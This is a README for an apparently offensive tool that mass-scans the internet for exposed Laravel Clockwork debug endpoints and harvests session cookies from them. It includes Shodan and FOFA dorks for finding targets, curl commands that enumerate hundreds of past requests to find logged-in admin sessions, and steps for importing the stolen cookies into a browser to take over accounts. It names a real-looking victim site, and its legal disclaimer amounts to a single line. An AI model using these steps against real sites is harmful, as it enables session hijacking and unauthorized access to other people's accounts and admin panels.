# Laravel Clockwork Scanner

Auto detect + extract cookies from exposed Clockwork endpoints.

## **Image Preview**
![Sample 1](https://github.com/khadafigans/Laravel-Clockwork/raw/main/laravel-clockwork.jpg)
![Sample 2](https://github.com/khadafigans/Laravel-Clockwork/raw/main/laravel-clockwork2.jpg)
![Sample 3](https://github.com/khadafigans/Laravel-Clockwork/raw/main/laravel-clockwork3.jpg)

## Install

```bash
pip install -r requirements.txt
```

## Usage

### Scan Known Targets
```bash
python main.py
# [2] Mass scan
# File: targets.txt
# Threads: 10

# Output: Results/hostname.com/cookies_cookie-editor.json
```

### Hunt New Targets (Shodan)
```bash
# Setup: Edit grabs.py line 18
SHODAN_API_KEY = "your_key_here"

python grabs.py
# [1] Grab domains
# Sites: 1000
# Country: US,GB,ID,VN
```

## Output

```
Results/
└── admin.forbes.vn/
    ├── cookies_cookie-editor.json  ⭐ COPY THIS
    ├── exposed_urls.txt
    └── EXPLOITATION_GUIDE.txt
```

## Enumeration Tool

For deeper cookie extraction (find authenticated sessions):

```bash
# Enumerate previous 500 requests
python enumerate_requests.py https://target.com 500

# Look for [AUTH] markers - those are logged-in sessions!
```

## Exploitation

### ⚠️ Important: Guest vs Authenticated Sessions

**Guest Cookies (common):**
- `authenticatedUser: null` in response
- Won't log you in - just empty sessions
- `main.py` extracts these automatically

**Authenticated Cookies (valuable):**
- `authenticatedUser` has user data
- CAN log you in - session hijacking!
- Use `enumerate_requests.py` to find these

See `COOKIE_HIJACKING_GUIDE.md` for details.

### Quick Method (If Cookies Are Authenticated)
```
1. Open: Results/hostname.com/cookies_cookie-editor.json
2. Copy JSON
3. Cookie Editor extension → Import
4. Visit site → Logged in! BOOM DUAR 💥
```

### Manual Enumeration - Deep Dive 🔍

Clockwork stores ALL HTTP request history. While `/__clockwork/latest` only shows the most recent request, you can view hundreds/thousands of previous requests!

**Step-by-step:**

```bash
# 1. Get the latest request first
curl https://domain.com/__clockwork/latest

# Response: "id": "1773145796-3659-1543456675"
```

**This ID is the key!** Using the latest ID, you can enumerate backwards:

```bash
# 2. View previous 100 requests
curl https://domain.com/__clockwork/1773145796-3659-1543456675/previous/100

# 3. View previous 500 requests (more = better chance!)
curl https://domain.com/__clockwork/1773145796-3659-1543456675/previous/500

# 4. Extreme mode: 1000 requests
curl https://domain.com/__clockwork/1773145796-3659-1543456675/previous/1000
```

**Why is this crucial?**

- Latest might only be **guest/unauthenticated**
- But 100-500 requests back could have **admin who just logged in**! 🎯
- More requests checked = higher chance of finding admin cookies
- Admin sessions = instant panel access

**Correct format:**
```
❌ WRONG: domain.com/__clockwork/latest/1-1-11/previous/100
✅ RIGHT: domain.com/__clockwork/1-1-11/previous/100
```

**Automated scanning:**
```bash
# Scanner automatically enumerates 500 previous requests
# Prioritizes ADMIN/USER sessions, skips GUEST
python main.py

# Manual enumeration for more:
python enumerate_requests.py https://target.com 1000
```

**Pro tips:**
- Look for `"authenticatedUser": {` in responses → these are authenticated!
- Admin sessions have higher privileges than regular users
- Scanner now auto-detects and prioritizes admin cookies
- Import to Cookie Editor → **BOOM access granted!** 💥

## Real Example

**Target:** admin.forbes.vn  
**URL:** https://admin.forbes.vn/__clockwork/latest  
**Cookies:** XSRF-TOKEN, registration_forbes_vietnam_session  
**Exploit:** Import cookies → Access admin panel

## Search Dorks

**FOFA:**
```
header="X-Clockwork"
```

**PublicWWW:**
```
"Set-Cookie: X-Clockwork"
```

**Shodan:** (built-in grabs.py)
```
http.header:"X-Clockwork"
http.html:"/__clockwork/app"
```

## Detection

Scanner only detects **valid Clockwork JSON**:
- ✅ Must be parseable JSON
- ✅ Must have 4+ Clockwork keys (id, version, cookies, sessionData, etc.)
- ✅ Rejects ALL HTML responses
- ❌ No false positives

## Files

- `main.py` - Scanner (detect + extract cookies)
- `grabs.py` - Shodan hunter (find targets)
- `requirements.txt` - Dependencies
- `DORKS_AND_EXPLOITATION.md` - Full guide

## Cookie Editor

Install: https://cookie-editor.com/

Import format (auto-generated):
```json
[
  {
    "name": "laravel_session",
    "value": "eyJpdiI6...",
    "domain": "target.com",
    "path": "/",
    "secure": true,
    "httpOnly": true
  }
]
```

## ⚠️ Legal Disclaimer
For authorized penetration testing & educational purposes only (user confirmed permission under ToS). Unauthorized use illegal/unethical.

## 👨‍💻 Author
[Bob Marley](https://github.com/khadafigans)

Buy me a Coffee:
```
₿ BTC: 17sbbeTzDMP4aMELVbLW78Rcsj4CDRBiZh
```

©2025 khadafigans
